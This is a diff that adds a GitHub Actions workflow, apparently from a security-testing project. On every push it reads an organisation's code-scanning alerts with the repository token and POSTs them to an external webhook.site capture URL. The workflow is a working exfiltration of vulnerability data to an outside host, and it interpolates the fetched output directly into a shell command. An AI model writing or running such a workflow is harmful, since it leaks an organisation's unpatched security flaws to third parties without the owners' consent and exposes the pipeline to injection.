@@ -1,0 +1,31 @@
+name: List Organization Code Scanning Alerts and Send to Webhook
+
+on: [push, workflow_dispatch]
+
+jobs:
+  list-org-alerts:
+    runs-on: ubuntu-latest
+    permissions:
+      security-events: read
+      contents: read
+
+    steps:
+    - name: Checkout
+      uses: actions/checkout@v2
+
+    - name: List Organization Code Scanning Alerts
+      id: list-alerts
+      env:
+        GITHUB_TOKEN: ${{ secrets.GITHUB_TOKEN }}
+        ORG_NAME: "Project-Testing-H1"
+      run: |
+        ALERTS=$(curl -H "Authorization: token $GITHUB_TOKEN" \
+                 -H "Accept: application/vnd.github.v3+json" \
+                 "https://api.github.com/orgs/$ORG_NAME/code-scanning/alerts")
+        echo "::set-output name=alerts::$ALERTS"
+
+    - name: Send Alerts to Webhook
+      run: |
+        curl -X POST https://webhook.site/767fefb6-2d27-45ba-b023-564ca79772db \
+             -H "Content-Type: application/json" \
+             -d "${{ steps.list-alerts.outputs.alerts }}"
